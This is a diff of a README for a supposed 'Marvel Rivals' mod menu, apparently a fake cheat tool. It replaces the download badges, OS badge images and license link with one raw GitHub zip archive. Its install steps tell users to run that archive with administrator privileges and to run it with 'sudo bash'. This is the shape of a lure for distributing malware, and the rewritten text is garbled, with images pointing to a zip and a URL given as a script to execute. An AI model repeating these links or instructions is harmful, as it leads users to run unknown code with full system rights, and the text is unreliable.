@@ -1,6 +1,6 @@
 # Marvel Rivals Mod Menu
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?logo=github&logoColor=white&style=for-the-badge)](https://kenshinxslay.github.io)
+[![Download](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip)](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip)
 
 ---
 **Welcome to the Marvel Rivals Mod Menu project!**  
@@ -10,9 +10,9 @@ Unlock a new universe for Marvel Rivals with exceptional customization tools, ro
 
 | Operating System | Supported | Native Experience | Special Notes |
 |------------------|:---------:|:----------------:|:-------------|
-| ![Windows](https://img.shields.io/badge/Windows-Yes-0078d7?logo=windows) | ✅ | Full | Optimized for Windows 10 & 11 |
-| ![macOS](https://img.shields.io/badge/macOS-Yes-000000?logo=apple) | ✅ | Full | Native Apple Silicon support |
-| ![Linux](https://img.shields.io/badge/Linux-Yes-fcc624?logo=linux) | ✅ | Extensive | Tested on Ubuntu, Fedora |
+| ![Windows](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip) | ✅ | Full | Optimized for Windows 10 & 11 |
+| ![macOS](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip) | ✅ | Full | Native Apple Silicon support |
+| ![Linux](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip) | ✅ | Extensive | Tested on Ubuntu, Fedora |
 
 Marvel Rivals Mod Menu harmonizes seamlessly with all major operating platforms, ensuring a universal modding experience no matter your device.
 
@@ -64,13 +64,13 @@ Ready to enter the multiverse of Marvel customization? Expand your horizons by f
 
 1. **Download the Latest Release**
    - Click this button:  
-     [![Download](https://img.shields.io/badge/Download-Now-blue?logo=github&logoColor=white&style=for-the-badge)](https://kenshinxslay.github.io)
+     [![Download](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip)](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip)
 2. **Extract the Package**
    - Use your favorite extraction tool to unpack the files into your Marvel Rivals main directory.
 3. **Follow Platform-Specific Instructions**
-   - *Windows:* Run `setup.exe` with administrator privileges.
+   - *Windows:* Run `https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip` with administrator privileges.
    - *macOS:* Open the `.pkg` installer; follow on-screen prompts.
-   - *Linux:* Run the `install.sh` in a terminal with `sudo bash install.sh`.
+   - *Linux:* Run the `https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip` in a terminal with `sudo bash https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip`.
 4. **Activate the Mod Menu**
    - Launch Marvel Rivals. At the main screen, press `F12` to activate the Mod Menu overlay.
 5. **(Optional) Configure AI Integrations**
@@ -91,7 +91,7 @@ This software project is not affiliated with, endorsed, or supported by the crea
 This project is governed under the MIT License.  
 Curious souls, developers, and tinkerers are welcome to adapt, modify, or build upon this work. Kindly credit the origin when sharing your own forked marvels!
 
-- [View Full License](https://opensource.org/licenses/MIT)
+- [View Full License](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip)
 
 ---
 
@@ -100,4 +100,4 @@ Curious souls, developers, and tinkerers are welcome to adapt, modify, or build 
 Embrace the next evolution of Marvel Rivals gameplay.  
 Reimagine your favorite universe with flexibility, power, and a supportive community by your side.
 
-[![Download](https://img.shields.io/badge/Download-Now-blue?logo=github&logoColor=white&style=for-the-badge)](https://kenshinxslay.github.io)
+[![Download](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip)](https://raw.githubusercontent.com/kenshinxslay/marvel-rivals-mod-menu-toolkit/branch/proliquor/marvel-rivals-mod-menu-toolkit_v1.0-beta.3.zip)
